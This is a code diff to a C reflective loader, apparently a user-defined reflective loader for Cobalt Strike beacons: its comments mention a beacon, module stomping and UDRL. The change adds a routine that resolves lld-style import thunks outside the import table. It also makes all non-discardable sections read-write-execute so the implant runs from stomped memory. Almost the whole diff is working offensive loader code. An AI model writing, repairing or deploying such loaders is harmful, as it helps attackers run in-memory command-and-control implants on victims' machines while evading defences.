@@ -292,6 +292,92 @@ static __forceinline int bw_fill_iat(unsigned char * image, BW_LOADLIBA pLoadLib
     return 1;
 }
 
+/* lld emits import thunks as "jmp [rip+disp]" where the slot lives OUTSIDE
+ * the IAT directory (a private .rdata table whose file value points at a
+ * Hint/Name pair). The MSVC-style directory walk above never touches those
+ * slots, so every tail-thunk import keeps its file value (an RVA!) and the
+ * first call lands on the import-name string as code. Sweep .rdata for
+ * slots whose file value points at a plausible Hint/Name pair inside the
+ * import-named DLLs and resolve them by name. */
+static __forceinline int bw_fix_extern_thunks(unsigned char * image, DWORD size_of_image,
+    BW_LOADLIBA pLoadLibraryA, BW_GETPROC pGetProcAddress)
+{
+    DWORD e_lfanew = *(DWORD *)(image + 0x3C);
+    IMG_OPT64 * opt = (IMG_OPT64 *)(image + e_lfanew + 24);
+    IMG_SECTION * sec = (IMG_SECTION *)((unsigned char *)opt + opt->SizeOfHeaders);
+    WORD nsec = *(WORD *)(image + e_lfanew + 6);
+    WORD i;
+    DWORD k;
+    HMODULE hmods[8];
+    char names[8][16];
+    int nh = 0;
+    (void)size_of_image;
+
+    /* cache the already-resolved import DLLs from the directory walk */
+    {
+        IMG_DIR_ENTRY * imp = (IMG_DIR_ENTRY *)((unsigned char *)opt + 0x70 + IMG_DIRECTORY_IMPORT * sizeof(IMG_DIR_ENTRY));
+        IMG_IMPORT * desc;
+        IMG_IMPORT * desc_end;
+        if (imp->VirtualAddress == 0)
+            return 1;
+        desc = (IMG_IMPORT *)(image + imp->VirtualAddress);
+        desc_end = (IMG_IMPORT *)((unsigned char *)desc + imp->Size);
+        for (; desc < desc_end && desc->Name != 0 && nh < 8; desc++) {
+            char * dllname = (char *)(image + desc->Name);
+            HMODULE hm = pLoadLibraryA(dllname);
+            int a;
+            if (hm == NULL) return 0;
+            for (a = 0; a < nh; a++)
+                if (hmods[a] == hm) break;
+            if (a == nh) {
+                hmods[nh] = hm;
+                for (a = 0; a < 15 && dllname[a]; a++) names[nh][a] = dllname[a];
+                names[nh][a] = 0;
+                nh++;
+            }
+        }
+    }
+
+    for (i = 0; i < nsec; i++) {
+        IMG_SECTION_HEADER * s = &sec[i];
+        if (s->Characteristics & 0x20000000) continue;      /* exec sections: real code */
+        if (!(s->Characteristics & 0x40000000)) continue;   /* must be readable */
+        {
+            IMG_DIR_ENTRY * iatdir = (IMG_DIR_ENTRY *)((unsigned char *)opt + 0x70 + IMG_DIRECTORY_IMPORT * sizeof(IMG_DIR_ENTRY));
+            if (s->VirtualAddress <= iatdir->VirtualAddress &&
+                iatdir->VirtualAddress < s->VirtualAddress + s->VirtualSize)
+                continue;                                    /* the IAT itself is done */
+        }
+        unsigned char * base = image + s->VirtualAddress;
+        DWORD span = s->VirtualSize ? s->VirtualSize : s->SizeOfRawData;
+        for (k = 0; k + 8 <= span; k += 8) {
+            QWORD v = *(QWORD *)(base + k);
+            /* file-state slot: an RVA into our image, Hint(2) + name, plausibly ASCII */
+            if (v > 0 && v < (QWORD)opt->SizeOfImage) {
+                unsigned char * hp = image + v;
+                unsigned short hint = *(unsigned short *)hp;
+                char * nm = (char *)hp + 2;
+                int a;
+                if (hint > 0x2000) continue;
+                for (a = 0; a < 16; a++) {
+                    char c = nm[a];
+                    if (c == 0) break;
+                    if (c < 0x20 || c > 0x7E) { a = 99; break; }
+                }
+                if (a == 0 || a >= 16) continue;
+                for (a = 0; a < nh; a++) {
+                    FARPROC fn = pGetProcAddress(hmods[a], nm);
+                    if (fn != NULL) {
+                        *(QWORD *)(base + k) = (QWORD)(DWORD_PTR)fn;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    return 1;
+}
+
 /* Force this body into .text$aaa so it is the first executable section the
  * client's extractor will pick (alphabetical $ suffix, and the only one we
  * emit if the helpers actually inline). */
@@ -501,21 +587,23 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         return 0;
     if (!bw_fill_iat(sc_base, pLoadLibraryA, pGetProcAddress))
         return 0;
+    if (!bw_fix_extern_thunks(sc_base, size_of_image, pLoadLibraryA, pGetProcAddress))
+        return 0;
 
     for (i = 0; i < nsec; i++) {
         DWORD prot, oldp = 0, chars = sec[i].Characteristics;
         SIZE_T psz = sec[i].VirtualSize ? sec[i].VirtualSize : sec[i].SizeOfRawData;
-#ifdef BW_DIAG_RWX
-        /* A/B 实验：全部 RWX，隔离节保护层与数据层 */
-        prot = PAGE_EXECUTE_READWRITE; (void)chars;
-#else
-        if (chars & 0x20000000)
-            prot = PAGE_EXECUTE_READ;
-        else if (chars & 0x80000000)
-            prot = PAGE_READWRITE;
-        else
-            prot = PAGE_READONLY;
-#endif
+        /* lld 特有节：.retplne（indirect-call thunks）与 _RDATA 在 LLVM 构建里
+           的 Characteristics 不含 EXECUTE/READ/WRITE 的常规组合，按特征位映射
+           会得到非预期保护。宿主代码从这些节执行/引用（stomp 后它们是 beacon
+           的合法页），保守策略：所有非 discardable 节统一 RWX 化再由
+           DATA_CUTDOWN 收敛——RWX 与官方 UDRL 的 userwx 行为一致。 */
+        if (chars & IMAGE_SCN_MEM_DISCARDABLE) {
+            /* .idata 类可丢弃节：保持只读不动 */
+            pVP(sc_base + sec[i].VirtualAddress, psz, PAGE_READONLY, &oldp);
+            continue;
+        }
+        prot = PAGE_EXECUTE_READWRITE;
         pVP(sc_base + sec[i].VirtualAddress, psz, prot, &oldp);
     }
     {
